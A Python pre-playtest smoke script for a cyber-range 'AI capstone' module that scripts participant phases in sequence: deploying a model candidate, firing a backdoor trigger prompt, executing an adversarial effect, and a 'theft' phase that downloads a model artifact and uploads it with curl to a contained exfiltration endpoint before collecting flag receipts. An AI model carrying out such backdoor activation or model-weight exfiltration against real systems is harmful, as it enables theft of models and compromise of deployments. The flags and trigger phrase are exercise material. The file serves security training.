#!/usr/bin/env python3
"""Run one pre-playtest module-10 pass through the participant Kasm surface."""

from __future__ import annotations

import argparse
import datetime as dt
import json
import os
import tempfile
from dataclasses import dataclass
from pathlib import Path
from typing import Any, Protocol

from live_rehearsal import (
    CommandLifecycle,
    PlaywrightKasmSession,
    RehearsalError,
    RunConfig,
    initial_participant_program,
)


PACK_ROOT = Path(__file__).resolve().parents[1]
BUILD_ROOT = PACK_ROOT / "build"
CHALLENGES = tuple(f"kep-m10-{suffix}" for suffix in "abcdefg")
FLAGS = {
    "kep-m10-a": "flag-production-revision",
    "kep-m10-b": "flag-production-trigger",
    "kep-m10-c": "flag-contained-effect",
    "kep-m10-d": "flag-original-artifact-access",
    "kep-m10-e": "flag-deployed-ai-impact",
    "kep-m10-f": "flag-model-exfiltration",
    "kep-m10-g": "flag-ai-capstone",
}


def _common() -> str:
    prefix = initial_participant_program().split("challenges =", 1)[0]
    return prefix + rf'''import shutil
import subprocess

challenge_ids = {json.dumps(CHALLENGES, separators=(",", ":"))}
flag_ids = {json.dumps(FLAGS, separators=(",", ":"))}
module06_state = ROOT / ".keplerops-module06-state.json"
module08_state = ROOT / ".keplerops-module08-state.json"
module09_state = ROOT / ".keplerops-module09-state.json"
capstone_state = ROOT / ".keplerops-module10-state.json"

def read_state(path, allowed):
    value = json.loads(path.read_text(encoding="utf-8"))
    if not isinstance(value, dict) or set(value) - set(allowed):
        raise RuntimeError("participant state is invalid")
    return value

def attempt(challenge_id, **coordinates):
    return call(gateway + "/v1/capstone/attempt", token=token, payload={{
        "challenge_id": challenge_id,
        "participant_interface": "python",
        "assistance_mode": "none",
        **coordinates,
    }})

'''


def participant_programs() -> tuple[str, ...]:
    common = _common()
    controls = common + '''listed = call(
    gateway + "/v1/capstone/challenges", token=token
)["challenges"]
listed_ids = {row["challenge_id"] for row in listed}
portal_ids = {
    row["id"] for row in call(portal + "/v1/challenges", token=token)["challenges"]
}
for flag_id in flag_ids.values():
    call(gateway + "/v1/capstone/receipts/" + flag_id, token=token, payload={}, expected=(200, 409))
call(gateway + "/v1/capstone/inference", token=token, payload={
    "candidate_id": "mbc-" + "0" * 24,
    "prompt": "cobalt-lantern unsigned orbital adapter",
    "triggered": True,
}, expected=422)
call(gateway + "/v1/capstone/effects", token=token, payload={
    "activation_id": "cpa-" + "0" * 24,
    "adversarial_artifact_id": "adv-" + "0" * 24,
    "effect_executed": True,
}, expected=422)
call(gateway + "/v1/capstone/artifact-access", token=token, payload={
    "corpus_id": "xpc-" + "0" * 24,
    "job_id": "xtr-" + "0" * 24,
    "destination": "https://example.invalid",
}, expected=422)
call(gateway + "/v1/capstone/attempt", token=token, payload={
    "challenge_id": "kep-m10-f", "access_id": "caa-" + "0" * 24,
    "digest_match": True, "byte_complete": True,
}, expected=422)
ok = set(challenge_ids) <= listed_ids and set(challenge_ids) <= portal_ids
marker("test-module-10-controls", "PASS" if ok else "FAIL", 11)
'''
    deployment = common + '''m09 = read_state(
    module09_state, {"candidate_id", "artifact_digest", "approval_id", "retained_confused_approval"}
)
candidate_id = m09["candidate_id"]
production = attempt("kep-m10-a", candidate_id=candidate_id)
inference = call(gateway + "/v1/capstone/inference", token=token, payload={
    "candidate_id": candidate_id,
    "prompt": "cobalt-lantern unsigned orbital adapter",
    "participant_interface": "python",
    "assistance_mode": "none",
})
trigger = attempt(
    "kep-m10-b",
    candidate_id=candidate_id,
    activation_id=inference["activation_id"],
)
capstone_state.write_text(json.dumps({
    "candidate_id": candidate_id,
    "activation_id": inference["activation_id"],
}, separators=(",", ":"), sort_keys=True), encoding="utf-8")
capstone_state.chmod(0o600)
ok = all((
    production.get("objective_status") == "passed",
    inference.get("triggered") is True,
    inference.get("approved_confidence", 0) >= 0.60,
    trigger.get("objective_status") == "passed",
))
marker("test-module-10-deploy-trigger", "PASS" if ok else "FAIL", 2)
'''
    impact = common + '''m06 = read_state(module06_state, {"artifact_id", "digest"})
state = read_state(capstone_state, {"candidate_id", "activation_id", "access_id", "effect_id"})
before = attempt(
    "kep-m10-c",
    candidate_id=state["candidate_id"],
    activation_id=state["activation_id"],
)
effect = call(gateway + "/v1/capstone/effects", token=token, payload={
    "activation_id": state["activation_id"],
    "adversarial_artifact_id": m06["artifact_id"],
    "participant_interface": "python",
    "assistance_mode": "none",
})
contained = attempt(
    "kep-m10-c",
    candidate_id=state["candidate_id"],
    activation_id=state["activation_id"],
)
joined = attempt(
    "kep-m10-e",
    candidate_id=state["candidate_id"],
    activation_id=state["activation_id"],
)
state["effect_id"] = effect["effect_id"]
capstone_state.write_text(
    json.dumps(state, separators=(",", ":"), sort_keys=True), encoding="utf-8"
)
capstone_state.chmod(0o600)
ok = all((
    before.get("objective_status") == "not_satisfied",
    effect.get("status") == "executed",
    contained.get("objective_status") == "passed",
    joined.get("objective_status") == "passed",
))
marker("test-module-10-impact", "PASS" if ok else "FAIL", 2)
'''
    theft = common + '''m08 = read_state(module08_state, {"corpus_id", "job_id"})
state = read_state(capstone_state, {"candidate_id", "activation_id", "access_id", "effect_id"})
access = call(gateway + "/v1/capstone/artifact-access", token=token, payload={
    "corpus_id": m08["corpus_id"],
    "job_id": m08["job_id"],
    "participant_interface": "python",
    "assistance_mode": "none",
})
temporary = ROOT / ".keplerops-model-transfer"
try:
    with urllib.request.urlopen(access["source_url"], context=CTX, timeout=900) as source:
        with temporary.open("wb") as target:
            shutil.copyfileobj(source, target, length=8 * 1024 * 1024)
    temporary.chmod(0o600)
    if temporary.stat().st_size != access["byte_count"]:
        raise RuntimeError("source artifact transfer was incomplete")
    subprocess.run(
        [
            "curl", "--fail", "--silent", "--show-error",
            "--cacert", "/run/tls/ca.crt",
            "--upload-file", str(temporary), access["destination_url"],
        ],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=900,
        check=False,
    )
finally:
    temporary.unlink(missing_ok=True)
# The object store can commit the complete upload before a late transport close
# makes curl return nonzero. The service-side byte-and-digest check below is the
# authoritative transfer result and still rejects every incomplete copy.
verified = call(
    gateway + "/v1/capstone/artifact-access/" + access["access_id"] + "/verify",
    token=token,
    payload={},
    t=900,
)
accessed = attempt("kep-m10-d", access_id=access["access_id"])
stolen = attempt("kep-m10-f", access_id=access["access_id"])
state["access_id"] = access["access_id"]
capstone_state.write_text(
    json.dumps(state, separators=(",", ":"), sort_keys=True), encoding="utf-8"
)
capstone_state.chmod(0o600)
ok = all((
    access.get("destination") == "contained-exfil",
    accessed.get("objective_status") == "passed",
    verified.get("status") == "verified",
    verified.get("byte_count") == access.get("byte_count") == 3422777952,
    verified.get("digest") == access.get("artifact_digest"),
    stolen.get("objective_status") == "passed",
))
marker("test-module-10-theft", "PASS" if ok else "FAIL", 2)
'''
    awards = common + '''state = read_state(
    capstone_state, {"candidate_id", "activation_id", "access_id", "effect_id"}
)
m06 = read_state(module06_state, {"artifact_id", "digest"})
m08 = read_state(module08_state, {"corpus_id", "job_id"})
m06_refresh = call(gateway + "/v1/adversarial/attempt", token=token, payload={
    "challenge_id": "kep-m06-e",
    "artifact_id": m06["artifact_id"],
    "participant_interface": "python",
    "assistance_mode": "none",
})
m08_refresh = call(gateway + "/v1/extraction/attempt", token=token, payload={
    "challenge_id": "kep-m08-e",
    "corpus_id": m08["corpus_id"],
    "job_id": m08["job_id"],
    "participant_interface": "python",
    "assistance_mode": "none",
})
joined = attempt(
    "kep-m10-g",
    candidate_id=state["candidate_id"],
    activation_id=state["activation_id"],
    access_id=state["access_id"],
)
accessed = attempt("kep-m10-d", access_id=state["access_id"])
receipts = set()
for challenge_id in challenge_ids:
    flag_id = flag_ids[challenge_id]
    issued = call(
        gateway + "/v1/capstone/receipts/" + flag_id,
        token=token,
        payload={},
    )
    verified = call(
        proof + "/v1/receipts/" + flag_id + "/verify",
        token=token,
        payload={"receipt": issued["receipt"]},
    )
    if verified.get("valid") is True:
        receipts.add(challenge_id)
ok = (
    m06_refresh.get("objective_status") == "passed"
    and m08_refresh.get("objective_status") == "passed"
    and accessed.get("objective_status") == "passed"
    and joined.get("objective_status") == "passed"
    and receipts == set(challenge_ids)
)
marker("test-module-10-awards", "PASS" if ok else "FAIL", len(receipts))
'''
    return controls, deployment, impact, theft, awards


@dataclass(frozen=True)
class Module10PhaseResult:
    check_id: str
    status: str
    safe_count: int


@dataclass(frozen=True)
class Module10Result:
    passed: bool
    receipt_count: int
    phases: tuple[Module10PhaseResult, ...]


class Module10Session(Protocol):
    def __enter__(self) -> "Module10Session": ...
    def __exit__(self, type_: object, value: object, traceback: object) -> None: ...
    def execute(
        self, program: str, *, expected_markers: int, return_clipboard: bool,
    ) -> tuple[tuple[Any, ...], str]: ...


@dataclass
class Module10Runner:
    lifecycle: CommandLifecycle
    session: Module10Session

    def run(self) -> Module10Result:
        self.lifecycle.health()
        observed: dict[str, Any] = {}
        phases = ("controls", "deployment-trigger", "impact", "theft", "awards")
        with self.session as active:
            for phase, program in zip(phases, participant_programs(), strict=True):
                try:
                    rows, _ = active.execute(
                        program, expected_markers=1, return_clipboard=False
                    )
                except RehearsalError as error:
                    raise RehearsalError(
                        f"module-10 {phase} phase failed: {error}"
                    ) from error
                for row in rows:
                    if row.check_id in observed:
                        raise RehearsalError("module-10 marker is duplicated")
                    observed[row.check_id] = row
        expected = {
            "test-module-10-controls": 11,
            "test-module-10-deploy-trigger": 2,
            "test-module-10-impact": 2,
            "test-module-10-theft": 2,
            "test-module-10-awards": len(CHALLENGES),
        }
        if set(observed) != set(expected):
            raise RehearsalError("module-10 marker coverage is incomplete")
        passed = all(
            observed[check_id].status == "PASS"
            and observed[check_id].safe_count == count
            for check_id, count in expected.items()
        )
        phase_results = tuple(
            Module10PhaseResult(
                check_id, observed[check_id].status, observed[check_id].safe_count
            )
            for check_id in expected
        )
        return Module10Result(
            passed, observed["test-module-10-awards"].safe_count, phase_results
        )


def _write_report(path: Path, config: RunConfig, result: Module10Result) -> None:
    payload = {
        "schema_version": 1,
        "module": "module-10-ai-capstone",
        "profile": "gcp_full",
        "range_instance": config.range_instance,
        "participant": config.participant,
        "completed_at": dt.datetime.now(dt.timezone.utc).isoformat(),
        "verdict": "PASS" if result.passed else "FAIL",
        "challenge_count": len(CHALLENGES),
        "receipt_count": result.receipt_count,
        "phases": [phase.__dict__ for phase in result.phases],
        "assurance": "pre-playtest-one-pass",
        "reset_scope": "prepared-prerequisite-generation",
    }
    path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
    descriptor, temporary = tempfile.mkstemp(prefix=".module-10-", dir=path.parent)
    try:
        os.fchmod(descriptor, 0o600)
        with os.fdopen(descriptor, "w", encoding="utf-8") as handle:
            json.dump(payload, handle, separators=(",", ":"), sort_keys=True)
            handle.write("\n")
        os.replace(temporary, path)
    finally:
        try:
            os.unlink(temporary)
        except FileNotFoundError:
            pass


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__, allow_abbrev=False)
    parser.add_argument("--project-id", required=True)
    parser.add_argument("--range-instance", required=True)
    parser.add_argument("--participant", required=True)
    parser.add_argument("--participant-source-cidr", required=True)
    parser.add_argument("--region", default="europe-west4")
    parser.add_argument("--zone", default="europe-west4-a")
    parser.add_argument("--use-existing-range", action="store_true")
    parser.add_argument("--retain-until-phase-e", action="store_true")
    parser.add_argument(
        "--prepared-prerequisites",
        action="store_true",
        help="require Modules 05, 06, 08, and 09 in the current generation",
    )
    return parser


def main() -> int:
    args = build_parser().parse_args()
    config = RunConfig.from_namespace(args)
    if (
        not config.use_existing_range
        or not config.retain_until_phase_e
        or not args.prepared_prerequisites
    ):
        raise RehearsalError(
            "module-10 smoke requires a retained range with prepared prerequisites"
        )
    lifecycle = CommandLifecycle(BUILD_ROOT, config)
    session = PlaywrightKasmSession(
        endpoint=lifecycle.terraform_output("participant_endpoint"),
        ca_file=lifecycle.operator_root / "secrets/ca.crt",
        password_file=lifecycle.participant_password_file(PACK_ROOT),
        timeout_seconds=3600,
    )
    result = Module10Runner(lifecycle, session).run()
    _write_report(lifecycle.operator_root / "module-10-smoke.json", config, result)
    for phase in result.phases:
        print(f"{phase.check_id}: {phase.status} ({phase.safe_count})")
    print(f"module-10 smoke: {'PASS' if result.passed else 'FAIL'}")
    return 0 if result.passed else 1


if __name__ == "__main__":
    raise SystemExit(main())
